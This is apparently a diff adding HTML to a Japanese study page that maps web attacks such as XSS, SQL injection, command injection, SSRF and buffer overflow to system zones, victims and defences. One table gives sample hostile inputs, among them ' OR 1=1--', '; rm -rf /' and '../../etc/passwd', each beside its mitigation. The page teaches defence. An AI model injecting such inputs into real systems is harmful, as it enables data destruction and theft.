+            <rect x="8" y="28" width="16" height="2.5" rx="1.2" fill="#1a56cc" opacity=".2"/>
+          </svg>
+          <span style="font-size:8.5px;font-weight:800;color:#1a56cc;font-family:var(--mono)">Browser</span>
+        </div>
+        <!-- ノード名 -->
+        <div style="font-size:10px;font-weight:700;color:#1a3a8a;text-align:center;line-height:1.3">ユーザの<br>ブラウザ</div>
+        <!-- 攻撃バッジ -->
+        <div style="display:flex;flex-direction:column;gap:3px;align-items:stretch;width:100%;padding:0 4px">
+          <span class="atk-badge blue" style="font-size:9px;justify-content:center">XSS</span>
+          <span class="atk-badge blue" style="font-size:9px;justify-content:center">クリックJK</span>
+        </div>
+      </div>
+
+      <!-- Arrow 1: ユーザ端末 → インターネット -->
+      <div style="flex:0 0 60px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:0 4px">
+        <span style="font-size:8.5px;font-family:var(--mono);font-weight:800;color:#1a56cc;margin-bottom:3px">HTTPS</span>
+        <div style="width:100%;height:2.5px;background:#1a56cc;position:relative;border-radius:2px">
+          <div style="position:absolute;right:-6px;top:-5px;width:0;height:0;border-top:6px solid transparent;border-bottom:6px solid transparent;border-left:9px solid #1a56cc"></div>
+        </div>
+        <span style="font-size:7.5px;color:#555;margin-top:3px">TLS</span>
+      </div>
+
+      <!-- ============= Zone 2: インターネット ============= -->
+      <div style="flex:0 0 190px;background:#fff5f5;border:1.5px dashed #e09090;border-radius:10px;padding:12px 8px 14px;display:flex;flex-direction:column;align-items:center;gap:8px">
+        <div style="font-size:9px;font-weight:700;color:#7a1818;letter-spacing:.08em;text-transform:uppercase;text-align:center;line-height:1.3">インターネット</div>
+        <div style="width:76px;height:76px;background:#fff;border:2.5px solid #7a1818;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;box-shadow:0 3px 10px rgba(122,24,24,.22)">
+          <svg width="44" height="34" viewBox="0 0 48 34" fill="none">
+            <ellipse cx="24" cy="22" rx="20" ry="10" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.4"/>
+            <ellipse cx="16" cy="19" rx="9" ry="7" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+            <ellipse cx="32" cy="19" rx="9" ry="7" fill="#ffe8e8" stroke="#7a1818" stroke-width="1.3"/>
+            <ellipse cx="24" cy="14" rx="10" ry="7" fill="#fde0e0" stroke="#7a1818" stroke-width="1.3"/>
+            <rect x="19" y="20" width="10" height="6" rx="1.5" fill="#7a1818" opacity=".4"/>
+            <line x1="21" y1="22" x2="27" y2="22" stroke="white" stroke-width="1" opacity=".8"/>
+            <line x1="21" y1="24" x2="25" y2="24" stroke="white" stroke-width="1" opacity=".6"/>
+          </svg>
+          <span style="font-size:8.5px;font-weight:800;color:#7a1818;font-family:var(--mono)">Internet</span>
+        </div>
+        <div style="font-size:10px;font-weight:700;color:#7a1818;text-align:center;line-height:1.3">公衆<br>ネットワーク</div>
+        <div style="display:flex;flex-direction:column;gap:3px;align-items:stretch;width:100%;padding:0 4px">
+          <span class="atk-badge danger" style="font-size:9px;justify-content:center">CSRF</span>
+          <span class="atk-badge danger" style="font-size:9px;justify-content:center">Session</span>
+        </div>
+      </div>
+
+      <!-- Arrow 2: インターネット → Webサーバ -->
+      <div style="flex:0 0 60px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:0 4px">
+        <span style="font-size:8.5px;font-family:var(--mono);font-weight:800;color:#155f44;margin-bottom:3px">HTTP(S)</span>
+        <div style="width:100%;height:2.5px;background:#155f44;position:relative;border-radius:2px">
+          <div style="position:absolute;right:-6px;top:-5px;width:0;height:0;border-top:6px solid transparent;border-bottom:6px solid transparent;border-left:9px solid #155f44"></div>
+        </div>
+        <span style="font-size:7.5px;color:#555;margin-top:3px">Request</span>
+      </div>
+
+      <!-- ============= Zone 3: Webサーバ ============= -->
+      <div style="flex:0 0 170px;background:#eaf7f1;border:1.5px dashed #70c898;border-radius:10px;padding:12px 8px 14px;display:flex;flex-direction:column;align-items:center;gap:8px">
+        <div style="font-size:9px;font-weight:700;color:#155f44;letter-spacing:.08em;text-transform:uppercase;text-align:center;line-height:1.3">Webサーバ</div>
+        <div style="width:76px;height:76px;background:#fff;border:2.5px solid #155f44;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;box-shadow:0 3px 10px rgba(21,95,68,.25)">
+          <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+            <rect x="4" y="5" width="32" height="10" rx="2.5" fill="#d0f0e0" stroke="#155f44" stroke-width="1.4"/>
+            <rect x="4" y="17" width="32" height="10" rx="2.5" fill="#d0f0e0" stroke="#155f44" stroke-width="1.4"/>
+            <circle cx="8.5" cy="10" r="2" fill="#60c090"/>
+            <circle cx="8.5" cy="22" r="2" fill="#60c090"/>
+            <line x1="14" y1="10" x2="32" y2="10" stroke="#155f44" stroke-width="1.3"/>
+            <line x1="14" y1="22" x2="32" y2="22" stroke="#155f44" stroke-width="1.3"/>
+            <line x1="14" y1="8" x2="22" y2="8" stroke="#155f44" stroke-width="1.1" opacity=".5"/>
+            <line x1="14" y1="20" x2="22" y2="20" stroke="#155f44" stroke-width="1.1" opacity=".5"/>
+            <path d="M6 31 L10 28 L14 31 L18 28 L22 31" stroke="#155f44" stroke-width="1.3" fill="none"/>
+            <path d="M22 31 L26 28 L30 31 L34 28" stroke="#155f44" stroke-width="1.3" fill="none" opacity=".5"/>
+          </svg>
+          <span style="font-size:8.5px;font-weight:800;color:#155f44;font-family:var(--mono)">Web App</span>
+        </div>
+        <div style="font-size:10px;font-weight:700;color:#155f44;text-align:center;line-height:1.3">Webアプリ<br>サーバ</div>
+        <div style="display:flex;flex-direction:column;gap:3px;align-items:stretch;width:100%;padding:0 4px">
+          <span class="atk-badge green" style="font-size:9px;justify-content:center">SQLi</span>
+          <span class="atk-badge green" style="font-size:9px;justify-content:center">OS Cmd</span>
+          <span class="atk-badge green" style="font-size:9px;justify-content:center">Dir.Tra.</span>
+          <span class="atk-badge green" style="font-size:9px;justify-content:center">HTTPヘッダi</span>
+        </div>
+      </div>
+
+      <!-- Arrow 3: Webサーバ → 内部 -->
+      <div style="flex:0 0 60px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:0 4px">
+        <span style="font-size:8.5px;font-family:var(--mono);font-weight:800;color:#5a1a9e;margin-bottom:3px">API</span>
+        <div style="width:100%;height:2.5px;background:#5a1a9e;position:relative;border-radius:2px">
+          <div style="position:absolute;right:-6px;top:-5px;width:0;height:0;border-top:6px solid transparent;border-bottom:6px solid transparent;border-left:9px solid #5a1a9e"></div>
+        </div>
+        <span style="font-size:7.5px;color:#555;margin-top:3px">内部呼出</span>
+      </div>
+
+      <!-- ============= Zone 4: 内部ネットワーク ============= -->
+      <div style="flex:0 0 150px;background:#f0ebff;border:1.5px dashed #b090e0;border-radius:10px;padding:12px 8px 14px;display:flex;flex-direction:column;align-items:center;gap:8px">
+        <div style="font-size:9px;font-weight:700;color:#5a1a9e;letter-spacing:.08em;text-transform:uppercase;text-align:center;line-height:1.3">内部ネットワーク</div>
+        <div style="width:76px;height:76px;background:#fff;border:2.5px solid #5a1a9e;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;box-shadow:0 3px 10px rgba(90,26,158,.22)">
+          <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+            <circle cx="20" cy="20" r="15" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.4"/>
+            <circle cx="20" cy="20" r="9" fill="rgba(90,26,158,.1)" stroke="#5a1a9e" stroke-width="1.2" stroke-dasharray="3 2"/>
+            <circle cx="20" cy="20" r="3.5" fill="#5a1a9e"/>
+            <line x1="8" y1="12" x2="14" y2="17" stroke="#5a1a9e" stroke-width="1.2"/>
+            <line x1="32" y1="12" x2="26" y2="17" stroke="#5a1a9e" stroke-width="1.2"/>
+            <line x1="8" y1="28" x2="14" y2="23" stroke="#5a1a9e" stroke-width="1.2"/>
+            <line x1="32" y1="28" x2="26" y2="23" stroke="#5a1a9e" stroke-width="1.2"/>
+            <circle cx="8" cy="12" r="3" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.2"/>
+            <circle cx="32" cy="12" r="3" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.2"/>
+            <circle cx="8" cy="28" r="3" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.2"/>
+            <circle cx="32" cy="28" r="3" fill="#ede8ff" stroke="#5a1a9e" stroke-width="1.2"/>
+          </svg>
+          <span style="font-size:8.5px;font-weight:800;color:#5a1a9e;font-family:var(--mono)">Internal</span>
+        </div>
+        <div style="font-size:10px;font-weight:700;color:#5a1a9e;text-align:center;line-height:1.3">内部NW<br>(OS/メモリ)</div>
+        <div style="display:flex;flex-direction:column;gap:3px;align-items:stretch;width:100%;padding:0 4px">
+          <span class="atk-badge purple" style="font-size:9px;justify-content:center">SSRF</span>
+          <span class="atk-badge purple" style="font-size:9px;justify-content:center">BOF</span>
+        </div>
+      </div>
+
+      <!-- Arrow 4: 内部 → データ処理 -->
+      <div style="flex:0 0 60px;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:0 4px">
+        <span style="font-size:8.5px;font-family:var(--mono);font-weight:800;color:#7a4208;margin-bottom:3px">SQL/IO</span>
+        <div style="width:100%;height:2.5px;background:#7a4208;position:relative;border-radius:2px">
+          <div style="position:absolute;right:-6px;top:-5px;width:0;height:0;border-top:6px solid transparent;border-bottom:6px solid transparent;border-left:9px solid #7a4208"></div>
+        </div>
+        <span style="font-size:7.5px;color:#555;margin-top:3px">永続化</span>
+      </div>
+
+      <!-- ============= Zone 5: データ処理 ============= -->
+      <div style="flex:1;background:#fffaf0;border:1.5px dashed #e0c070;border-radius:10px;padding:12px 8px 14px;display:flex;flex-direction:column;align-items:center;gap:8px;min-width:140px">
+        <div style="font-size:9px;font-weight:700;color:#7a4208;letter-spacing:.08em;text-transform:uppercase;text-align:center;line-height:1.3">データ処理</div>
+        <div style="width:76px;height:76px;background:#fff;border:2.5px solid #7a4208;border-radius:12px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;box-shadow:0 3px 10px rgba(122,66,8,.22)">
+          <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
+            <ellipse cx="20" cy="10" rx="13" ry="4.5" fill="#fdf3d0" stroke="#b5821e" stroke-width="1.4"/>
+            <path d="M7 10 L7 30 Q7 35 20 35 Q33 35 33 30 L33 10" stroke="#b5821e" stroke-width="1.4" fill="rgba(255,220,100,.12)"/>
+            <path d="M7 17 Q7 22 20 22 Q33 22 33 17" stroke="#b5821e" stroke-width="1.2" fill="none"/>
+            <path d="M7 24 Q7 29 20 29 Q33 29 33 24" stroke="#b5821e" stroke-width="1.2" fill="none"/>
+            <line x1="13" y1="19" x2="27" y2="19" stroke="#b5821e" stroke-width="1.1" opacity=".4"/>
+            <line x1="13" y1="26" x2="27" y2="26" stroke="#b5821e" stroke-width="1.1" opacity=".4"/>
+          </svg>
+          <span style="font-size:8.5px;font-weight:800;color:#7a4208;font-family:var(--mono)">DB / FS</span>
+        </div>
+        <div style="font-size:10px;font-weight:700;color:#7a4208;text-align:center;line-height:1.3">DB・<br>ファイルSys</div>
+        <div style="display:flex;flex-direction:column;gap:3px;align-items:stretch;width:100%;padding:0 4px">
+          <span class="atk-badge warn" style="font-size:9px;justify-content:center">SQLi→DB</span>
+          <span class="atk-badge warn" style="font-size:9px;justify-content:center">Dir.Tra→FS</span>
+        </div>
+      </div>
+
+    </div><!-- /メインフロー行 -->
+
+    <!-- セキュリティ技術マッピングバー -->
+    <div style="margin-top:12px;background:#f8f9ff;border:1px solid var(--line);border-radius:8px;padding:12px 14px">
+      <div style="font-size:9.5px;font-weight:700;color:var(--ink2);margin-bottom:10px;letter-spacing:.06em;text-transform:uppercase">どのポイントの攻撃か — 一目対応表</div>
+      <div style="display:grid;grid-template-columns:repeat(5,1fr);gap:8px">
+        <div style="background:#eaf3ff;border:1px solid #a0c8f5;border-radius:6px;padding:8px 10px">
+          <div style="font-size:9px;font-weight:700;color:#1a3a8a;margin-bottom:4px">ブラウザで実行</div>
+          <div style="display:flex;flex-wrap:wrap;gap:3px"><span class="atk-badge blue" style="font-size:8px">XSS</span><span class="atk-badge blue" style="font-size:8px">クリックジャッキング</span></div>
+        </div>
+        <div style="background:#fff5f5;border:1px solid #e0a0a0;border-radius:6px;padding:8px 10px">
+          <div style="font-size:9px;font-weight:700;color:#7a1818;margin-bottom:4px">通信経路・HTTP操作</div>
+          <div style="display:flex;flex-wrap:wrap;gap:3px"><span class="atk-badge danger" style="font-size:8px">CSRF</span><span class="atk-badge danger" style="font-size:8px">セッション攻撃</span><span class="atk-badge danger" style="font-size:8px">HTTPヘッダi</span></div>
+        </div>
+        <div style="background:#eaf7f1;border:1px solid #80c898;border-radius:6px;padding:8px 10px">
+          <div style="font-size:9px;font-weight:700;color:#155f44;margin-bottom:4px">アプリ層への注入</div>
+          <div style="display:flex;flex-wrap:wrap;gap:3px"><span class="atk-badge green" style="font-size:8px">SQLi</span><span class="atk-badge green" style="font-size:8px">OS Cmd</span><span class="atk-badge green" style="font-size:8px">Dir.Tra.</span></div>
+        </div>
+        <div style="background:#f0ebff;border:1px solid #b0a0e0;border-radius:6px;padding:8px 10px">
+          <div style="font-size:9px;font-weight:700;color:#5a1a9e;margin-bottom:4px">内部ネットワーク</div>
+          <div style="display:flex;flex-wrap:wrap;gap:3px"><span class="atk-badge purple" style="font-size:8px">SSRF</span></div>
+        </div>
+        <div style="background:#fffaf0;border:1px solid #e0c070;border-radius:6px;padding:8px 10px">
+          <div style="font-size:9px;font-weight:700;color:#7a4208;margin-bottom:4px">メモリ・低レイヤ</div>
+          <div style="display:flex;flex-wrap:wrap;gap:3px"><span class="atk-badge warn" style="font-size:8px">BOF</span></div>
+        </div>
+      </div>
+    </div>
+
+  </div><!-- /全体フロー -->
+</div>
+
+<!-- 動的分類マトリクス（タブ切替） -->
+<h3>多角的分類マトリクス — タブで切り替え</h3>
+<div class="matrix-wrap">
+  <div class="matrix-tabs">
+    <div class="mtab active" onclick="switchTab('tab-target')">攻撃対象別</div>
+    <div class="mtab" onclick="switchTab('tab-method')">注入手法別</div>
+    <div class="mtab" onclick="switchTab('tab-victim')">被害者別</div>
+    <div class="mtab" onclick="switchTab('tab-danger')">危険度・難易度</div>
+    <div class="mtab" onclick="switchTab('tab-defense')">対策の種類</div>
+  </div>
+
+  <!-- タブ1: 攻撃対象別 -->
+  <div class="mpanel active" id="tab-target">
+    <p style="font-size:12.5px;color:#3a3d52;margin-bottom:14px">攻撃が「どのコンポーネントを標的にするか」による分類。同じコンポーネントを狙う攻撃は根本対策が共通することが多い。</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px">
+
+      <div style="border:2px solid #1a56cc;border-radius:10px;overflow:hidden">
+        <div style="background:#1a56cc;padding:10px 12px;display:flex;align-items:center;gap:8px">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+          <div><div style="font-size:12px;font-weight:800;color:white">ブラウザ / DOM</div><div style="font-size:9px;color:rgba(255,255,255,.7)">クライアント側の欠陥を利用</div></div>
+        </div>
+        <div style="padding:12px;background:#f0f5ff">
+          <div style="display:flex;flex-direction:column;gap:6px">
+            <div style="background:#daeeff;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#1a3a8a;margin-bottom:3px">XSS（クロスサイトスクリプティング）</div>
+              <div style="font-size:10.5px;color:#3a3d52">悪意あるスクリプトをブラウザ上で実行</div>
+            </div>
+            <div style="background:#daeeff;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#1a3a8a;margin-bottom:3px">クリックジャッキング</div>
+              <div style="font-size:10.5px;color:#3a3d52">透明iframeでクリックを横取り</div>
+            </div>
+            <div style="background:#daeeff;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#1a3a8a;margin-bottom:3px">セッションハイジャック</div>
+              <div style="font-size:10.5px;color:#3a3d52">Cookie窃取によるセッション乗っ取り</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="border:2px solid var(--danger);border-radius:10px;overflow:hidden">
+        <div style="background:var(--danger);padding:10px 12px;display:flex;align-items:center;gap:8px">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+          <div><div style="font-size:12px;font-weight:800;color:white">サーバ / DB / OS</div><div style="font-size:9px;color:rgba(255,255,255,.7)">サーバ側コンポーネントへの注入</div></div>
+        </div>
+        <div style="padding:12px;background:#fff5f5">
+          <div style="display:flex;flex-direction:column;gap:6px">
+            <div style="background:#fde8e8;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#7a1818;margin-bottom:3px">SQLインジェクション</div>
+              <div style="font-size:10.5px;color:#3a3d52">SQL文を注入してDBを不正操作</div>
+            </div>
+            <div style="background:#fde8e8;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#7a1818;margin-bottom:3px">OSコマンドインジェクション</div>
+              <div style="font-size:10.5px;color:#3a3d52">シェルコマンドを注入してOS制御</div>
+            </div>
+            <div style="background:#fde8e8;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#7a1818;margin-bottom:3px">バッファオーバーフロー</div>
+              <div style="font-size:10.5px;color:#3a3d52">メモリを溢れさせて任意コード実行</div>
+            </div>
+            <div style="background:#fde8e8;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#7a1818;margin-bottom:3px">ディレクトリトラバーサル</div>
+              <div style="font-size:10.5px;color:#3a3d52">パス操作でファイルシステムに不正アクセス</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="border:2px solid var(--success);border-radius:10px;overflow:hidden">
+        <div style="background:var(--success);padding:10px 12px;display:flex;align-items:center;gap:8px">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+          <div><div style="font-size:12px;font-weight:800;color:white">通信 / セッション</div><div style="font-size:9px;color:rgba(255,255,255,.7)">HTTPプロトコルの信頼を悪用</div></div>
+        </div>
+        <div style="padding:12px;background:#f0fbf5">
+          <div style="display:flex;flex-direction:column;gap:6px">
+            <div style="background:#d0f0e0;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#155f44;margin-bottom:3px">CSRF</div>
+              <div style="font-size:10.5px;color:#3a3d52">認証済みセッションを悪用した偽リクエスト</div>
+            </div>
+            <div style="background:#d0f0e0;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#155f44;margin-bottom:3px">SSRF</div>
+              <div style="font-size:10.5px;color:#3a3d52">サーバを踏み台にした内部リクエスト</div>
+            </div>
+            <div style="background:#d0f0e0;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#155f44;margin-bottom:3px">HTTPヘッダインジェクション</div>
+              <div style="font-size:10.5px;color:#3a3d52">CRLFでレスポンスヘッダを分割・改ざん</div>
+            </div>
+            <div style="background:#d0f0e0;border-radius:6px;padding:8px 10px">
+              <div style="font-size:11px;font-weight:700;color:#155f44;margin-bottom:3px">メールヘッダインジェクション</div>
+              <div style="font-size:10.5px;color:#3a3d52">CRLFでメールヘッダにBcc等を追加</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- タブ2: 注入手法別 -->
+  <div class="mpanel" id="tab-method">
+    <p style="font-size:12.5px;color:#3a3d52;margin-bottom:14px">「何を」「どこに」注入するかによる分類。同じ「注入」でも注入先の構文ルールが異なるため、それぞれ異なる対策が必要。</p>
+    <table style="width:100%;border-collapse:collapse;font-size:12.5px">
+      <thead>
+        <tr style="background:var(--ink2);color:#fff">
+          <th style="padding:9px 12px;text-align:left;font-size:11px;letter-spacing:.05em">注入手法</th>
+          <th style="padding:9px 12px;text-align:left;font-size:11px;letter-spacing:.05em">注入する素材</th>
+          <th style="padding:9px 12px;text-align:left;font-size:11px;letter-spacing:.05em">注入先の構文</th>
+          <th style="padding:9px 12px;text-align:left;font-size:11px;letter-spacing:.05em">代表的な攻撃</th>
+          <th style="padding:9px 12px;text-align:left;font-size:11px;letter-spacing:.05em">無害化の原則</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr style="border-bottom:1px solid var(--line)">
+          <td style="padding:9px 12px;font-weight:700;color:var(--danger)">スクリプト注入</td>
+          <td style="padding:9px 12px;color:#3a3d52;font-family:var(--mono);font-size:11px">&lt;script&gt;...</td>
+          <td style="padding:9px 12px;color:#3a3d52">HTMLドキュメント</td>
+          <td style="padding:9px 12px"><span class="atk-badge danger" style="font-size:10px">XSS</span></td>
+          <td style="padding:9px 12px;color:var(--success);font-size:11.5px">HTML特殊文字のエスケープ</td>
+        </tr>
+        <tr style="background:var(--surface);border-bottom:1px solid var(--line)">
+          <td style="padding:9px 12px;font-weight:700;color:var(--danger)">SQL文注入</td>
+          <td style="padding:9px 12px;color:#3a3d52;font-family:var(--mono);font-size:11px">' OR 1=1--</td>
+          <td style="padding:9px 12px;color:#3a3d52">SQL構文</td>
+          <td style="padding:9px 12px"><span class="atk-badge danger" style="font-size:10px">SQLi</span></td>
+          <td style="padding:9px 12px;color:var(--success);font-size:11.5px">プリペアドステートメント</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--line)">
+          <td style="padding:9px 12px;font-weight:700;color:var(--danger)">コマンド注入</td>
+          <td style="padding:9px 12px;color:#3a3d52;font-family:var(--mono);font-size:11px">; rm -rf /</td>
+          <td style="padding:9px 12px;color:#3a3d52">シェル構文</td>
+          <td style="padding:9px 12px"><span class="atk-badge danger" style="font-size:10px">OSコマンドi</span></td>
+          <td style="padding:9px 12px;color:var(--success);font-size:11.5px">シェル非使用・引数分離</td>
+        </tr>
+        <tr style="background:var(--surface);border-bottom:1px solid var(--line)">
+          <td style="padding:9px 12px;font-weight:700;color:var(--danger)">パス操作</td>
+          <td style="padding:9px 12px;color:#3a3d52;font-family:var(--mono);font-size:11px">../../etc/passwd</td>
+          <td style="padding:9px 12px;color:#3a3d52">ファイルパス</td>
+          <td style="padding:9px 12px"><span class="atk-badge warn" style="font-size:10px">Dir.Tra.</span></td>
+          <td style="padding:9px 12px;color:var(--success);font-size:11.5px">パス正規化・間接参照</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--line)">
+          <td style="padding:9px 12px;font-weight:700;color:var(--danger)">改行コード注入</td>
+          <td style="padding:9px 12px;color:#3a3d52;font-family:var(--mono);font-size:11px">%0d%0a（CRLF）</td>
+          <td style="padding:9px 12px;color:#3a3d52">HTTPヘッダ・メールヘッダ</td>
+          <td style="padding:9px 12px"><span class="atk-badge green" style="font-size:10px">HTTPヘッダi</span><span class="atk-badge green" style="font-size:10px">メールヘッダi</span></td>
+          <td style="padding:9px 12px;color:var(--success);font-size:11.5px">CRLF除去</td>
+        </tr>
+        <tr style="background:var(--surface);border-bottom:1px solid var(--line)">
+          <td style="padding:9px 12px;font-weight:700;color:var(--danger)">データ溢れ</td>
+          <td style="padding:9px 12px;color:#3a3d52;font-family:var(--mono);font-size:11px">AAAA...(大量データ)</td>
+          <td style="padding:9px 12px;color:#3a3d52">メモリバッファ</td>
+          <td style="padding:9px 12px"><span class="atk-badge warn" style="font-size:10px">BOF</span></td>
+          <td style="padding:9px 12px;color:var(--success);font-size:11.5px">境界チェック・ASLR</td>
+        </tr>
+        <tr style="border-bottom:1px solid var(--line)">
+          <td style="padding:9px 12px;font-weight:700;color:var(--danger)">偽リクエスト送信</td>
+          <td style="padding:9px 12px;color:#3a3d52;font-family:var(--mono);font-size:11px">imgタグ・form</td>
+          <td style="padding:9px 12px;color:#3a3d52">HTTP通信</td>
+          <td style="padding:9px 12px"><span class="atk-badge blue" style="font-size:10px">CSRF</span><span class="atk-badge blue" style="font-size:10px">SSRF</span></td>
+          <td style="padding:9px 12px;color:var(--success);font-size:11.5px">トークン検証・ホワイトリスト</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- タブ3: 被害者別 -->
+  <div class="mpanel" id="tab-victim">
+    <p style="font-size:12.5px;color:#3a3d52;margin-bottom:14px">攻撃によって誰が被害を受けるかによる分類。被害者に応じた対策の方向性が変わる。</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+
+      <div style="border:2px solid #1a56cc;border-radius:10px;overflow:hidden">
+        <div style="background:linear-gradient(135deg,#1a56cc,#0e3a8a);padding:12px 16px;display:flex;align-items:center;gap:10px">
+          <svg width="28" height="28" viewBox="0 0 32 32" fill="none" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="16" cy="10" r="5"/><path d="M6 28c0-5.5 4.5-9 10-9s10 3.5 10 9"/></svg>
+          <div><div style="font-size:13px;font-weight:800;color:white">ユーザ被害型</div><div style="font-size:9.5px;color:rgba(255,255,255,.75)">エンドユーザが直接被害を受ける</div></div>
+        </div>
+        <div style="padding:14px;background:#f0f5ff">
+          <div style="display:flex;flex-direction:column;gap:6px">
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #c0d8f5">
+              <span class="atk-badge blue" style="font-size:10px;flex-shrink:0">XSS</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">Cookie窃取でアカウント乗っ取り / フィッシング画面を表示 / キーロガー埋め込み</div>
+            </div>
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #c0d8f5">
+              <span class="atk-badge blue" style="font-size:10px;flex-shrink:0">CSRF</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">意図しない送金 / パスワード変更 / SNS投稿 / 購入</div>
+            </div>
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #c0d8f5">
+              <span class="atk-badge blue" style="font-size:10px;flex-shrink:0">セッション攻撃</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">アカウントを乗っ取られ、不正購入・情報漏洩</div>
+            </div>
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #c0d8f5">
+              <span class="atk-badge blue" style="font-size:10px;flex-shrink:0">クリックジャッキング</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">意図しないボタンクリック（公開設定・送金承認等）</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div style="border:2px solid var(--danger);border-radius:10px;overflow:hidden">
+        <div style="background:linear-gradient(135deg,var(--danger),#a02020);padding:12px 16px;display:flex;align-items:center;gap:10px">
+          <svg width="28" height="28" viewBox="0 0 32 32" fill="none" stroke="white" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="6" width="24" height="18" rx="2.5"/><line x1="4" y1="12" x2="28" y2="12"/><circle cx="8.5" cy="9" r="1.5" fill="white"/><circle cx="12.5" cy="9" r="1.5" fill="white"/></svg>
+          <div><div style="font-size:13px;font-weight:800;color:white">サーバ・組織被害型</div><div style="font-size:9.5px;color:rgba(255,255,255,.75)">サービス提供側が被害を受ける</div></div>
+        </div>
+        <div style="padding:14px;background:#fff5f5">
+          <div style="display:flex;flex-direction:column;gap:6px">
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #e0a0a0">
+              <span class="atk-badge danger" style="font-size:10px;flex-shrink:0">SQLi</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">個人情報DB漏洩 / 認証バイパス / DB全削除</div>
+            </div>
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #e0a0a0">
+              <span class="atk-badge danger" style="font-size:10px;flex-shrink:0">OSコマンドi</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">サーバ完全制御 / バックドア設置 / 機密ファイル窃取</div>
+            </div>
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #e0a0a0">
+              <span class="atk-badge danger" style="font-size:10px;flex-shrink:0">SSRF</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">内部API・DB・クラウドメタデータへの不正アクセス</div>
+            </div>
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #e0a0a0">
+              <span class="atk-badge danger" style="font-size:10px;flex-shrink:0">Dir.Tra.</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">/etc/passwd・設定ファイル・ソースコード漏洩</div>
+            </div>
+            <div style="display:flex;align-items:flex-start;gap:8px;padding:8px;background:#fff;border-radius:6px;border:1px solid #e0a0a0">
+              <span class="atk-badge warn" style="font-size:10px;flex-shrink:0">メールヘッダi</span>
+              <div style="font-size:11px;color:#3a3d52;line-height:1.5;min-width:0">スパム踏み台化 / 送信ドメインのブラックリスト入り</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
